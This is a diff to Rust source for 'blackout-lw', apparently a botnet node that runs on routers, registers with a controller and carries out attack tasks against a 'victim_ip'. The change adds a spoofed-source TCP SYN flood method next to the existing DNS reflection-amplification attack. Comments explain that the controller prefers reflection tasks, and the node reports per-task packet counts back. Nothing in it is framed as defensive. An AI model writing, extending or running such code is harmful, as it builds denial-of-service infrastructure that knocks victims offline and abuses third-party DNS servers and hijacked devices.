@@ -52,7 +52,7 @@ struct HeartbeatReq<'a> {
 pub fn run(cfg: &Config) -> Result<(), HError> {
     // 注册失败（网络/控制器未起）时重试而非退出：节点会因一次抖动永久消失，
     // 而路由器上通常没有 supervisor 拉起进程。仅 token 被拒才退出。
-    let mut node_id = register_with_retry(cfg)?;
+    let node_id = register_with_retry(cfg)?;
     eprintln!("blackout-lw: registered as {node_id}");
 
     let stats = std::sync::Arc::new(Stats::default());
@@ -160,7 +160,10 @@ fn register(cfg: &Config) -> Result<String, HError> {
 }
 
 fn run_task(cfg: &Config, node_id: &str, task: &TaskMsg, stats: &std::sync::Arc<Stats>) -> Result<(), HError> {
-    if task.method != "dns_reflector" {
+    // lw 支持的方法：dns_reflector（UDP 反射放大，优先）与 tcp_syn（伪源 SYN 洪水）。
+    // 优先级的决策在 Controller 侧（先派反射任务，无反射可派时才派 tcp_syn）。
+    let method = task.method.as_str();
+    if method != "dns_reflector" && method != "tcp_syn" {
         eprintln!("blackout-lw: task {} method {} not supported by lw, skipping", task.task_id, task.method);
         return Ok(());
     }
@@ -171,34 +174,64 @@ fn run_task(cfg: &Config, node_id: &str, task: &TaskMsg, stats: &std::sync::Arc<
             return Ok(());
         }
     };
-    // 拉池（优先用任务内嵌 targets，否则拉全池）
-    let reflectors = if !task.targets.is_empty() {
-        task.targets.iter().filter_map(|s| reflector::parse_entry(s)).collect()
-    } else {
-        reflector::fetch_dns_pool(&cfg.controller, &cfg.token, 2000)?
-    };
-    if reflectors.is_empty() {
-        eprintln!("blackout-lw: task {} no reflectors, skipping", task.task_id);
-        return Ok(());
-    }
 
-    let spec = crate::attack::TaskSpec {
-        task_id: task.task_id.clone(),
-        victim_ip,
-        duration_secs: task.duration,
-        threads: task.threads,
-        reflectors,
-        max_pps: cfg.max_pps,
+    let spec = if method == "dns_reflector" {
+        // 拉池（优先用任务内嵌 targets，否则拉全池）
+        let reflectors = if !task.targets.is_empty() {
+            task.targets.iter().filter_map(|s| reflector::parse_entry(s)).collect()
+        } else {
+            reflector::fetch_dns_pool(&cfg.controller, &cfg.token, 2000)?
+        };
+        if reflectors.is_empty() {
+            eprintln!("blackout-lw: task {} no reflectors, skipping", task.task_id);
+            return Ok(());
+        }
+        crate::attack::TaskSpec {
+            task_id: task.task_id.clone(),
+            victim_ip,
+            victim_port: 0,
+            duration_secs: task.duration,
+            threads: task.threads,
+            reflectors,
+            max_pps: cfg.max_pps,
+        }
+    } else {
+        // tcp_syn：目标端口（缺省 80）
+        let port = task
+            .target
+            .rsplit(':')
+            .next()
+            .and_then(|p| p.parse::<u16>().ok())
+            .unwrap_or(80);
+        crate::attack::TaskSpec {
+            task_id: task.task_id.clone(),
+            victim_ip,
+            victim_port: port,
+            duration_secs: task.duration,
+            threads: task.threads,
+            reflectors: Vec::new(),
+            max_pps: cfg.max_pps,
+        }
     };
+
     eprintln!(
-        "blackout-lw: task {} dns_reflector -> {} ({}) threads={} dur={}s",
-        task.task_id, task.target, fmt_ip(victim_ip), spec.threads, spec.duration_secs
+        "blackout-lw: task {} {} -> {} ({}) threads={} dur={}s",
+        task.task_id,
+        method,
+        task.target,
+        fmt_ip(victim_ip),
+        spec.threads,
+        spec.duration_secs
     );
     // 差值统计：Stats 跨任务累计，只上报本任务的增量包数
     let p0 = stats.packets();
     let b0 = stats.bytes();
     let e0 = stats.errors();
-    run_dns_reflection(&spec, std::sync::Arc::clone(stats));
+    if method == "dns_reflector" {
+        run_dns_reflection(&spec, std::sync::Arc::clone(stats));
+    } else {
+        crate::attack::run_tcp_syn(&spec, std::sync::Arc::clone(stats));
+    }
     let dp = stats.packets() - p0;
     let db = stats.bytes() - b0;
     let de = stats.errors() - e0;
